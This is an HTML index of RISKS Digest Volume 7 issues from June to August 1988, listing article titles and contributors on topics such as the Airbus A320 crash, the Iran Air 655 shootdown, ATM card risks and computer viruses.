<DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.1.html">Volume 7 Issue 1 (1 Jun 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.1.html#subj1">  RISKS of Evolution and Evolution of RISKS (PGN)</A>
<LI><A HREF="/Risks/7.1.html#subj2">  Re: Risks of automatic test acknowledgement (Paul Traina)</A>
<LI><A HREF="/Risks/7.1.html#subj3">  Computing Down Under (Willis H. Ware)</A>
<LI><A HREF="/Risks/7.1.html#subj4">  Computer Tampering Case to go to Trial (Joe Morris)</A>
<LI><A HREF="/Risks/7.1.html#subj5">  Software can destroy hardware (Willis Johnson and John B. Nagle via danno)</A>
<LI><A HREF="/Risks/7.1.html#subj6">  Cash on the Nail, by Daedalus (Brian Randell, Jacob Oestergaard Baekke)</A>
<LI><A HREF="/Risks/7.1.html#subj7">  Re: Down in the Dumps (Stan R.Z., Mark W. Eichin, Dan Klein, Dan Franklin)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.2.html">Volume 7 Issue 2 (2 Jun 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.2.html#subj1">  Happenstance and $70 Million (Patrick A. Townson)</A>
<LI><A HREF="/Risks/7.2.html#subj2">  Re: Optimisers too tacit, perhaps? (Tim McDaniel)</A>
<LI><A HREF="/Risks/7.2.html#subj3">  Re: Optimisers; Telecommunications Redundancy (Michael Wagner)</A>
<LI><A HREF="/Risks/7.2.html#subj4">  Major security hole in some sun systems     (Pete Cottrell and Steve Miller and Jim Purtilo and Chris Torek)
</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.3.html">Volume 7 Issue 3 (3 Jun 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.3.html#subj1">  OTA Report: Science, Technology, and the First Amendment (Jan Wolitzky)</A>
<LI><A HREF="/Risks/7.3.html#subj2">  Disasters and computer facilities (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.3.html#subj3">  Running as root; Hinsdale redundacy; Daedelus (David Herron)</A>
<LI><A HREF="/Risks/7.3.html#subj4">  Optimizing PL/I (Bard Bloom)</A>
<LI><A HREF="/Risks/7.3.html#subj5">  Re: Auckland cable cars (Richard A. O'Keefe)</A>
<LI><A HREF="/Risks/7.3.html#subj6">  My experience with metal balloons (David J. Edgerton)</A>
<LI><A HREF="/Risks/7.3.html#subj7">  Halon (Romain Kang)</A>
<LI><A HREF="/Risks/7.3.html#subj8">  Virus collection (Robert Slade)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.4.html">Volume 7 Issue 4 (6 Jun 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.4.html#subj1">  Review article on privacy/civil liberties risks in CACM (Jon Jacky)</A>
<LI><A HREF="/Risks/7.4.html#subj2">  RISKS of wrong numbers and tigers (Steve Nuchia)</A>
<LI><A HREF="/Risks/7.4.html#subj3">  Academic Assignment of Viruses (Bill Murray)</A>
<LI><A HREF="/Risks/7.4.html#subj4">  Peter J. Denning on Terminology (Bill Kinnersley)</A>
<LI><A HREF="/Risks/7.4.html#subj5">  COMPASS '88 PROGRAM (Frank Houston)</A>
<LI><A HREF="/Risks/7.4.html#subj6">  Halon agreement and the ozone models (Rob Horn)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.5.html">Volume 7 Issue 5 (7 Jun 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.5.html#subj1">  Re: Auckland cable cars (in Wellington) (Mark Davies)</A>
<LI><A HREF="/Risks/7.5.html#subj2">  Perfect computers (Hugh Cartwright)</A>
<LI><A HREF="/Risks/7.5.html#subj3">  Assigning viruses (Ian G Batten)</A>
<LI><A HREF="/Risks/7.5.html#subj4">  Programmer sabotage (Bob Devine)</A>
<LI><A HREF="/Risks/7.5.html#subj5">  First Interstate disaster planning and the L.A. fire (Jeff Lindorff)</A>
<LI><A HREF="/Risks/7.5.html#subj6">  Telecommunications redundancy (Joel Kirsh)</A>
<LI><A HREF="/Risks/7.5.html#subj7">  Look and Feel Copyright Issue (Karl A. Nyberg)</A>
<LI><A HREF="/Risks/7.5.html#subj8">  Risks of root typos (Tim Pointing)</A>
<LI><A HREF="/Risks/7.5.html#subj9">  Access to DEC VMS 5.0 technical seminar (Claude Barbe)</A>
<LI><A HREF="/Risks/7.5.html#subj10">  Risks of bank ATM cards (Karl Denninger)</A>
<LI><A HREF="/Risks/7.5.html#subj11">  Re: Australia Card (Greg Bond)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.6.html">Volume 7 Issue 6 (8 Jun 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.6.html#subj1">  Buggy ATC Software (Paul Fuqua)</A>
<LI><A HREF="/Risks/7.6.html#subj2">  The Challenger and visionary software architects (Kent Stork)</A>
<LI><A HREF="/Risks/7.6.html#subj3">  How To Stop A War (Henry Spencer) </A>
<LI><A HREF="/Risks/7.6.html#subj4">  UK Poly; another root typo (Matt Bishop)</A>
<LI><A HREF="/Risks/7.6.html#subj5">  Re: The Australia Card (Amos Shapir)</A>
<LI><A HREF="/Risks/7.6.html#subj6">  Re: Risks of bank ATM cards (John Pershing)</A>
<LI><A HREF="/Risks/7.6.html#subj7">  ATM risks - the figures in UK (Alasdair Rawsthorne)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.7.html">Volume 7 Issue 7 (10 Jun 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.7.html#subj1">  Accidental breach of software security (Martin Minow)</A>
<LI><A HREF="/Risks/7.7.html#subj2">  "Sewage flows into river; Computer Failure Blamed" (Randal L. Schwartz)</A>
<LI><A HREF="/Risks/7.7.html#subj3">  Canadian Public Service warned against SINing (John Coughlin)</A>
<LI><A HREF="/Risks/7.7.html#subj4">  Betting network crash in Australia (George Michaelson)</A>
<LI><A HREF="/Risks/7.7.html#subj5">  John Pershing on ATMs  (David Thomasson)</A>
<LI><A HREF="/Risks/7.7.html#subj6">  A typo in "UK Poly; another root typo" (Matt Bishop)</A>
<LI><A HREF="/Risks/7.7.html#subj7">  Re: The Challenger and visionary software architects (Eugene Miya)</A>
<LI><A HREF="/Risks/7.7.html#subj8">  COMPASS '88 CONTACT (Frank Houston)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.8.html">Volume 7 Issue 8 (16 Jun 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.8.html#subj1">  New Jersey wants computer audit trails disabled (Joe Morris)</A>
<LI><A HREF="/Risks/7.8.html#subj2">  Bunkers (C H Longmore) </A>
<LI><A HREF="/Risks/7.8.html#subj3">  More on Blackhawk helicopter (Dave Horsfall)</A>
<LI><A HREF="/Risks/7.8.html#subj4">  Root typos (Ken Yap)</A>
<LI><A HREF="/Risks/7.8.html#subj5">  Costs/risks of impregnable telephone booths (Geoff Goodfellow)</A>
<LI><A HREF="/Risks/7.8.html#subj6">  Science, Journalism, and Whistle-Blowing (HENRY SPENCER)</A>
<LI><A HREF="/Risks/7.8.html#subj7">  Shrink Wrap (BILL MURRAY)</A>
<LI><A HREF="/Risks/7.8.html#subj8">  Hard-disk risks from vendors (Jerry Harper)</A>
<LI><A HREF="/Risks/7.8.html#subj9">  An old CTSS virus (Tom Van Vleck)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.9.html">Volume 7 Issue 9 (22 Jun 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.9.html#subj1">  Risks of ATM manufacturers (Philip E. Agre)</A>
<LI><A HREF="/Risks/7.9.html#subj2">  Risks of bank ATMs (Mary-Anne Wolf, Larry E. Kollar)</A>
<LI><A HREF="/Risks/7.9.html#subj3">  Yet more on the Blackhawk helicopter Jan Wolitzky)</A>
<LI><A HREF="/Risks/7.9.html#subj4">  Re: root typos (Dave Curry, nyssa)</A>
<LI><A HREF="/Risks/7.9.html#subj5">  Notice to the OTA mailing list (Eric Roberts)</A>
<LI><A HREF="/Risks/7.9.html#subj6">  Challenger Payoff? (Richard Outerbridge)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.10.html">Volume 7 Issue 10 (27 Jun 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.10.html#subj1">  Four killed as Airbus crashes (Duncan Baillie)</A>
<LI><A HREF="/Risks/7.10.html#subj2">  Laziness as an excuse (Matthew P Wiener)</A>
<LI><A HREF="/Risks/7.10.html#subj3">  Privacy vs. Security (Larry Hunter)</A>
<LI><A HREF="/Risks/7.10.html#subj4">  Re-using government databases (Amos Shapir)</A>
<LI><A HREF="/Risks/7.10.html#subj5">  Root Bloopers (Doug Krause)</A>
<LI><A HREF="/Risks/7.10.html#subj6">  Problems with VARs (Hal Norman)</A>
<LI><A HREF="/Risks/7.10.html#subj7">  Fail-safe ATMs (Steve Philipson)</A>
<LI><A HREF="/Risks/7.10.html#subj8">  Malicious Code Reports (Joseph M. Beckman)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.11.html">Volume 7 Issue 11 (29 Jun 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.11.html#subj1">  Risks of answering machines (Dave Horsfall)</A>
<LI><A HREF="/Risks/7.11.html#subj2">  Airline reservation crash (Dave Horsfall)</A>
<LI><A HREF="/Risks/7.11.html#subj3">  Updates on Airbus crash (Duncan Baillie, Klaus Brunnstein, Laura Halliday)</A>
<LI><A HREF="/Risks/7.11.html#subj4">  root typos (Joe Eykholt)</A>
<LI><A HREF="/Risks/7.11.html#subj5">  "large-scale" disasters (Hinsdale, Ill.)  (Tom Perrine)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.12.html">Volume 7 Issue 12 (30 Jun 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.12.html#subj1">  Airbus 320 (Steve Philipson)</A>
<LI><A HREF="/Risks/7.12.html#subj2">  Background on the A-320 incident (Willis Ware)</A>
<LI><A HREF="/Risks/7.12.html#subj3">  Fly-By-Wire (John O. Rutemiller)</A>
<LI><A HREF="/Risks/7.12.html#subj4">  Airbus 320 (H.Ludwig Hausen)</A>
<LI><A HREF="/Risks/7.12.html#subj5">  $40 million Pentagon computer system failure (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.12.html#subj6">  Re: Another "silent fault tolerance" example: DWIM (Tim Budd via Mark Brader)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.13.html">Volume 7 Issue 13 (1 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.13.html#subj1">  "Scratch-and-win"?  Try "X-ray-and-win"! (PGN)</A>
<LI><A HREF="/Risks/7.13.html#subj2">  SDIO computers stolen (PGN)</A>
<LI><A HREF="/Risks/7.13.html#subj3">  Did DWIM DWYW (Do what you wanted)? (Stephen D. Crocker)</A>
<LI><A HREF="/Risks/7.13.html#subj4">  Directions and Implications of Advanced Computing - DIAC-88 (Douglas Schuler)</A>
<LI><A HREF="/Risks/7.13.html#subj5">  Grocery Store Barcodes: Another game you don't win (David A. Pearlman)</A>
<LI><A HREF="/Risks/7.13.html#subj6">  ATM "receipts" (Mark Brader)</A>
<LI><A HREF="/Risks/7.13.html#subj7">  Re: Risks of bank ATM cards (Dan Franklin)</A>
<LI><A HREF="/Risks/7.13.html#subj8">  Risks of ATMs and the people who unload them (Rob Austein)</A>
<LI><A HREF="/Risks/7.13.html#subj9">  More problems with VARs (Joe Morris)</A>
<LI><A HREF="/Risks/7.13.html#subj10">  Re: Hard-disk risks from vendors (George Pajari)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.14.html">Volume 7 Issue 14 (1 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.14.html#subj1">  The Eyes Have It (unique driver's license numbers) (Woody)</A>
<LI><A HREF="/Risks/7.14.html#subj2">  New UK Virus (Will Martin)</A>
<LI><A HREF="/Risks/7.14.html#subj3">  Australia Card - more details (Chris Maltby)</A>
<LI><A HREF="/Risks/7.14.html#subj4">  Re: The Challenger and visionary software architects (Jerry Hollombe)</A>
<LI><A HREF="/Risks/7.14.html#subj5">  Academic Assignment of Viruses (John Gregor)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.15.html">Volume 7 Issue 15 (5 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.15.html#subj1">  "The target is destroyed." (Iranian Airbus) (Hugh Miller)</A>
<LI><A HREF="/Risks/7.15.html#subj2">  Clarifications on the A320 Design (Nancy Leveson)</A>
<LI><A HREF="/Risks/7.15.html#subj3">  Virus aimed at EDS gets NASA instead (Dave Curry)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.16.html">Volume 7 Issue 16 (6 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.16.html#subj1">  Air France Airbus A320 Crash Story In Aviation Week (Karl Lehenbauer)</A>
<LI><A HREF="/Risks/7.16.html#subj2">  Common failure path in A320 (Lee Naish)</A>
<LI><A HREF="/Risks/7.16.html#subj3">  Reply to Hugh Miller about Iran Flight 655 (Michael Mauldin)</A>
<LI><A HREF="/Risks/7.16.html#subj4">  The Iranian airliner tragedy (Bob Estell)</A>
<LI><A HREF="/Risks/7.16.html#subj5">  Aegis and the Iran Airbus (PGN)</A>
<LI><A HREF="/Risks/7.16.html#subj6">  The "F-14" attacking the Vincennes... But the F-14 is for air defense       (Jonathan Crone)
</A>
<LI><A HREF="/Risks/7.16.html#subj7">  It's easy to make decisions if you don't have the facts (Martin Minow)</A>
<LI><A HREF="/Risks/7.16.html#subj8">  Re: A300 using F14 transponder (Bruce O'Neel)</A>
<LI><A HREF="/Risks/7.16.html#subj9">  Iran Flight 655 and the Vincennes (James P. Anderson)</A>
<LI><A HREF="/Risks/7.16.html#subj10">  Lockpicking (Randy D. Miller)</A>
<LI><A HREF="/Risks/7.16.html#subj11">  Re: The Eyes Have It (Tracey Baker)</A>
<LI><A HREF="/Risks/7.16.html#subj12">  RISK of PIN's - PNB calling card (Scott Peterson)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.17.html">Volume 7 Issue 17 (8 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.17.html#subj1">  Politics and Risk (Gary Chapman)</A>
<LI><A HREF="/Risks/7.17.html#subj2">  Iranian Airbus ([mis]quotation from the SFO Chronicle) (David Parnas)</A>
<LI><A HREF="/Risks/7.17.html#subj3">  Re: Iranian Airbus and the "facts" (Sue McPherson)</A>
<LI><A HREF="/Risks/7.17.html#subj4">  Threshold probability for declaring a radar blip "hostile" (Clifford Johnson)</A>
<LI><A HREF="/Risks/7.17.html#subj5">  Iran Airline Incident and meaningful real-time data (Chris McDonald)</A>
<LI><A HREF="/Risks/7.17.html#subj6">  A320 Airbus: Air conditioning; monitoring traffic control; F-14s    (Steve Philipson)
</A>
<LI><A HREF="/Risks/7.17.html#subj7">  Iranian Airbus Blame? (Chaz Heritage)</A>
<LI><A HREF="/Risks/7.17.html#subj8">  Re: "The target is destroyed." (Henry Spencer)</A>
<LI><A HREF="/Risks/7.17.html#subj9">  An epilogue to this issue (PGN)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.18.html">Volume 7 Issue 18 (8 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.18.html#subj1">  N-Version Programming (Jim Valerio, Nancy Leveson)</A>
<LI><A HREF="/Risks/7.18.html#subj2">  Physical hazards (Henry Spencer)</A>
<LI><A HREF="/Risks/7.18.html#subj3">  Accu-Scan inaccuracies (Robert Steven Glickstein)</A>
<LI><A HREF="/Risks/7.18.html#subj4">  The Eyes Have It (Don Watrous, Evelyn C. Leeper)</A>
<LI><A HREF="/Risks/7.18.html#subj5">  Lockpicking (Geoff Kuenning, Henry Schaffer, Lee Hounshell)</A>
<LI><A HREF="/Risks/7.18.html#subj6">  Another "silent fault tolerance" example: DWIM (Mike O'Brien)</A>
<LI><A HREF="/Risks/7.18.html#subj7">  ATM receipts (Joe Beckenbach)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.19.html">Volume 7 Issue 19 (10 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.19.html#subj1">  Iranian Airbus discussion (Philip E. Agre, Tracy Tims, Hugh Miller)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.20.html">Volume 7 Issue 20 (11 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.20.html#subj1">  "Computers may be at root of jet downing" (PGN)</A>
<LI><A HREF="/Risks/7.20.html#subj2">  Iran Airbus tragedy (Chris Moss)</A>
<LI><A HREF="/Risks/7.20.html#subj3">  Shooting down Flight 655 (Herb Lin)</A>
<LI><A HREF="/Risks/7.20.html#subj4">  Ignoring the wolf (Andy Freeman)</A>
<LI><A HREF="/Risks/7.20.html#subj5">  Air France Airbus crash (Henry Spencer)</A>
<LI><A HREF="/Risks/7.20.html#subj6">  Re: Physical hazards - poorly designed switches (John Robert LoVerso)</A>
<LI><A HREF="/Risks/7.20.html#subj7">  PIN on PNB calling card (Mark Mandel)</A>
<LI><A HREF="/Risks/7.20.html#subj8">  Lockpicking (Henry Spencer, Robert Mathiesen, Doug Faunt, Chaz Heritage)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.21.html">Volume 7 Issue 21 (13 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.21.html#subj1">  $54.1 million embezzlement foiled (Dave Curry)</A>
<LI><A HREF="/Risks/7.21.html#subj2">  Aegis (DAve Curry)</A>
<LI><A HREF="/Risks/7.21.html#subj3">  Iran Air Incident (Bob McKay)</A>
<LI><A HREF="/Risks/7.21.html#subj4">  "Binary thinking" misses a lot (Bob Estell)</A>
<LI><A HREF="/Risks/7.21.html#subj5">  Automatic Air Traffic Control (Eldred)</A>
<LI><A HREF="/Risks/7.21.html#subj6">  Aviation units of measure (Joe Morris)</A>
<LI><A HREF="/Risks/7.21.html#subj7">  Mouse trap (James H. Coombs)</A>
<LI><A HREF="/Risks/7.21.html#subj8">  Threshold probability for declaring a radar blip "hostile"    (Mike Wellman, Clifford Johnson)
</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.22.html">Volume 7 Issue 22 (14 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.22.html#subj1">  A-320 Airbus Crash Inquiry (Brian Randell)</A>
<LI><A HREF="/Risks/7.22.html#subj2">  User interface problem in the Aegis system? (Kee Hinckley)</A>
<LI><A HREF="/Risks/7.22.html#subj3">  Radar cross sections, Flt. 655, and F-14s (Eugene Miya)</A>
<LI><A HREF="/Risks/7.22.html#subj4">  GM Blames Computer for Smelly Vans (PGN)</A>
<LI><A HREF="/Risks/7.22.html#subj5">  Lockpicking at Los Alamos (Gary McClelland)</A>
<LI><A HREF="/Risks/7.22.html#subj6">  Supposedly-unique id. no. from non-unique personal characteristics    (Larry Margolis)
</A>
<LI><A HREF="/Risks/7.22.html#subj7">  NJ Driver's license number coding (Scott Robbins)</A>
<LI><A HREF="/Risks/7.22.html#subj8">  Colwich Junction, England, 1986 (Mark Brader)</A>
<LI><A HREF="/Risks/7.22.html#subj9">  Shades of Fantasy in Real-Life -- group games (acwf?)</A>
<LI><A HREF="/Risks/7.22.html#subj10">  IQ measurement by machine? (Mark Brader)</A>
<LI><A HREF="/Risks/7.22.html#subj11">  Aviation units (Richard S. D'Ippolito)</A>
<LI><A HREF="/Risks/7.22.html#subj12">  RISKS and PGN Saturation! (PGN)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.23.html">Volume 7 Issue 23 (16 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.23.html#subj1">  Policy Chief Indicted in Computer Misuse (Owen Blevins)</A>
<LI><A HREF="/Risks/7.23.html#subj2">  Data for Iran airliner discussion (Dave Fiske)</A>
<LI><A HREF="/Risks/7.23.html#subj3">  Re: Data "viruses" (Peter J. Denning, PGN)</A>
<LI><A HREF="/Risks/7.23.html#subj4">  Invitation to visit Disaster Research Center (DRC)</A>
<LI><A HREF="/Risks/7.23.html#subj5">  Passwords on networked systems (Steve Oualline)</A>
<LI><A HREF="/Risks/7.23.html#subj6">  Other ways to manage risks (Dave Fiske)</A>
<LI><A HREF="/Risks/7.23.html#subj7">  Colwich Junction, England, 1986 (Blair P. Houghton)</A>
<LI><A HREF="/Risks/7.23.html#subj8">  Oops -- risks of writing -- SI prefixes (Richard S D'Ippolito)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.24.html">Volume 7 Issue 24 (18 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.24.html#subj1">  The IRS Illinois Experiment (Patrick A. Townson)</A>
<LI><A HREF="/Risks/7.24.html#subj2">  Aegis testing data withheld from Congress (Gary Chapman)</A>
<LI><A HREF="/Risks/7.24.html#subj3">  "Man in the loop" (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.24.html#subj4">  Aegis (Charles Daffinger)</A>
<LI><A HREF="/Risks/7.24.html#subj5">  Lightning strikes... (again?) (Don Mac Phee)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.25.html">Volume 7 Issue 25 (20 Jul 88  )</A>
<DD><UL>
<LI><A HREF="/Risks/7.25.html#subj1">  Possible reason for unexpected Audi 100 acceleration (Lars Lindwall) </A>
<LI><A HREF="/Risks/7.25.html#subj2">  Bell blames computer error as $4 calls are billed for $400 (David Sherman)</A>
<LI><A HREF="/Risks/7.25.html#subj3">  Programming BART (Bay Area Rapid Transit) (Eugene Miya)</A>
<LI><A HREF="/Risks/7.25.html#subj4">  Re: The IRS Illinois Experiment (Michael L. McLean, Lars J Poulsen)</A>
<LI><A HREF="/Risks/7.25.html#subj5">  Error rates in barcode data (John Colville)</A>
<LI><A HREF="/Risks/7.25.html#subj6">  PIN on PNB calling card (Nathan K. Meyers)</A>
<LI><A HREF="/Risks/7.25.html#subj7">  Re: Risks of bank ATM cards (George H. Feil)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.26.html">Volume 7 Issue 26 (24 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.26.html#subj1">  Misuse of the UK Data Protection Act (Brian Randell)</A>
<LI><A HREF="/Risks/7.26.html#subj2">  Risks of not running new software in parallel with old (Jon Reeves)</A>
<LI><A HREF="/Risks/7.26.html#subj3">  Computer Error causes bills to be mailed to wrong address (Todd Medlin)</A>
<LI><A HREF="/Risks/7.26.html#subj4">  Penetrating the Phone System (John Markoff via Geoff Goodfellow)</A>
<LI><A HREF="/Risks/7.26.html#subj5">  Electronic IQ Testing (Stephen Colwill)</A>
<LI><A HREF="/Risks/7.26.html#subj6">  Re: IRS and Electronic Filing (Bill Bohrer)</A>
<LI><A HREF="/Risks/7.26.html#subj7">  Re: The IRS Illinois Experiment (Henry Spencer)</A>
<LI><A HREF="/Risks/7.26.html#subj8">  Re: "Man in the loop" (Will Martin)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.27.html">Volume 7 Issue 27 (25 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.27.html#subj1">  A Fishy Story (John Colville)</A>
<LI><A HREF="/Risks/7.27.html#subj2">  Inconsistent Data Taxes Vancouver Woman (Don Chiasson)</A>
<LI><A HREF="/Risks/7.27.html#subj3">  Computer Viruses and RETROVIRUSES (Peter J. Denning)</A>
<LI><A HREF="/Risks/7.27.html#subj4">  Hacking central office switches - too easy? (John T. Powers Jr.)</A>
<LI><A HREF="/Risks/7.27.html#subj5">  "Man in the Loop" (Bill Murray)</A>
<LI><A HREF="/Risks/7.27.html#subj6">  AEGIS (Herb Lin)</A>
<LI><A HREF="/Risks/7.27.html#subj7">  Journal of Computing and Society (Gary Chapman)</A>
<LI><A HREF="/Risks/7.27.html#subj8">  Barcodes (Jerome H. Saltzer)</A>
<LI><A HREF="/Risks/7.27.html#subj9">  The IRS Illinois Experiment (Lenoil)</A>
<LI><A HREF="/Risks/7.27.html#subj10">  "Scratch-and-win"? Try "X-ray-and-win"! (Fred Baube)</A>
<LI><A HREF="/Risks/7.27.html#subj11">  PIN on PNB calling card (Mark Mandel)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.28.html">Volume 7 Issue 28 (26 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.28.html#subj1">  Pentagon testing (Mike Trout)</A>
<LI><A HREF="/Risks/7.28.html#subj2">  Re: "Man in the Loop" (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.28.html#subj3">  NOVA on risks of fighter technology (Dave Curry)</A>
<LI><A HREF="/Risks/7.28.html#subj4">  Re: Hacking central office switches (Laura Halliday)</A>
<LI><A HREF="/Risks/7.28.html#subj5">  Law student sues micro sysop under ECPA (John Gilmore)</A>
<LI><A HREF="/Risks/7.28.html#subj6">  Scanning instant-win lottery cards (Rich Kulawiec)</A>
<LI><A HREF="/Risks/7.28.html#subj7">  Wanted: Info on Ergonometrics (Emily S. Bryant for Michael Whitman)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.29.html">Volume 7 Issue 29 (27 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.29.html#subj1">  Comparison of hazards (Henry Spencer)</A>
<LI><A HREF="/Risks/7.29.html#subj2">  NASTRAN and the order-of-magnitude bug (David E. Bakken, via Mark Brader)</A>
<LI><A HREF="/Risks/7.29.html#subj3">  "Person In The Loop" (Clifford Johnson)</A>
<LI><A HREF="/Risks/7.29.html#subj4">  "Person In The Loop" -- A BarCode example (David A. Honig)</A>
<LI><A HREF="/Risks/7.29.html#subj5">  Security vs. Cost of Breakin (David A. Honig)</A>
<LI><A HREF="/Risks/7.29.html#subj6">  Hacking central office switches - too easy? (Skip Montanaro)</A>
<LI><A HREF="/Risks/7.29.html#subj7">  Re: PIN on PNB calling card (Roy Smith)</A>
<LI><A HREF="/Risks/7.29.html#subj8">  Re: IRS Illinois Experiment (Allan Pratt)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.30.html">Volume 7 Issue 30 (29 Jul 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.30.html#subj1">  NASTRAN and ship steel (Lindsay F. Marshall)</A>
<LI><A HREF="/Risks/7.30.html#subj2">  Is vibration a known A300 problem? (Eric Roskos)</A>
<LI><A HREF="/Risks/7.30.html#subj3">  Business Week article on computer security (Woody Weaver)</A>
<LI><A HREF="/Risks/7.30.html#subj4">  Computers can increase privacy, too! (Robert Weiss)</A>
<LI><A HREF="/Risks/7.30.html#subj5">  Viruses - a medical view (John Pettitt)</A>
<LI><A HREF="/Risks/7.30.html#subj6">  Apple viruses -- don't go through the ZLINK    (Practor Fime, Dr. Logic, The Byter -- via Greg Prevost via Eric Haines)
</A>
<LI><A HREF="/Risks/7.30.html#subj7">  On IRS direct computer access (Steven C. Den Beste)</A>
<LI><A HREF="/Risks/7.30.html#subj8">  Re: doing away with privileged users (Alan Silverstein)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.31.html">Volume 7 Issue 31 (8 Aug 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.31.html#subj1">  Software failures cost Britain $900M per year, study claims (Jon Jacky)</A>
<LI><A HREF="/Risks/7.31.html#subj2">  Lightning strikes (twice) (PGN)</A>
<LI><A HREF="/Risks/7.31.html#subj3">  Computer failure delays flights at Logan Airport (PGN)</A>
<LI><A HREF="/Risks/7.31.html#subj4">  A320 &amp; A300 safety, risks of so-called experts (Michael Pilling)</A>
<LI><A HREF="/Risks/7.31.html#subj5">  RISKS of Electronic Cash-registers (Robin Kirkham)</A>
<LI><A HREF="/Risks/7.31.html#subj6">  Computer terminals and dermatology (richard welty)</A>
<LI><A HREF="/Risks/7.31.html#subj7">  Computer System Vulnerabilities (Rodney Hoffman)</A>
